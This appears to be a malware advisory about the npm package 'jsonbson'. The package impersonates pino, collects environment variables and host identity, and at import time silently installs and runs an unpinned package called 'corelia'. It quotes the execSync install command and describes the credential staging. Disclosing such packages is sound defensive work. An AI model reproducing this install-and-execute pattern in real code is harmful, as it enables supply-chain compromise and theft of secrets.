summary: jsonbson impersonates pino and drops attacker-controlled 'corelia' package on require
details: Package metadata impersonates the pino logging library (main: pino.js, homepage: https://getpino.io, keywords copied from pino, API surface duplicated). On require, lib/writer.js (lines 30-44) first assembles an object containing the full process.env plus os.hostname(), os.userInfo().username, MAC addresses, and platform/version fields. It then unconditionally calls require('corelia'); if that module is not installed, it runs execSync('npm install corelia --no-warnings --no-save --no-progress --loglevel silent') and immediately require()s '../../corelia/pino.js'. This downloads and executes whatever bytes the separate npm package 'corelia' currently publishes — unpinned, unverified, attacker-controlled — in the same process where the harvested env+identity object is in scope. Any application that pulls jsonbson (directly or transitively) thinking it relates to pino installs and runs the second-stage payload at import time. Three independent block signals coexist: import-time install-and-execute of an unpinned external package, bulk environment/credential staging, and intentional typosquat impersonation.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
